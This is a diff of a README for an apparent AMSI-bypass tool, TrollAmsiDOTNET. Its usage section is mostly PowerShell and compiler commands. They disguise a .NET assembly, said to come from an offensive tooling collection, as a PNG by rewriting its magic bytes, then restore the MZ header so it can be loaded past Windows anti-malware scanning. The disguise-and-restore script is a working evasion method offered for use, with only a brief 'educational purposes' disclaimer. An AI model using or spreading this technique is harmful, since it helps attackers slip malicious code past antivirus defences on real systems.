@@ -8,9 +8,10 @@ Because even if you bypass amsi, when you any sort of assembly.load, the byte ar
 
 ![Image](https://github.com/user-attachments/assets/c893ef11-20a5-455a-a62c-1d6a717884fe)
 
-
 ## Usage 
 ```
+#First download TrollAmsiDOTNET.cs and dog.png (taken from flangvik/SharpCollection nightly build, you can sha1 the bytes before loading to check)
+
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /optimize /out:TrollAmsiDOTNET.dll /target:library TrollAmsiDOTNET.cs > $null
 $MZHeader = [byte[]](0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00)
 $fileBytes = [System.IO.File]::ReadAllBytes("C:\troll\dog.png")
@@ -32,7 +33,6 @@ $fileBytes = [System.IO.File]::ReadAllBytes($infile)
 for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $pngMagicBytes[$i] }
 [System.IO.File]::WriteAllBytes($outfile, $fileBytes)
 ```
-
 
 ## Disclaimer
 Should only be used for educational purposes!
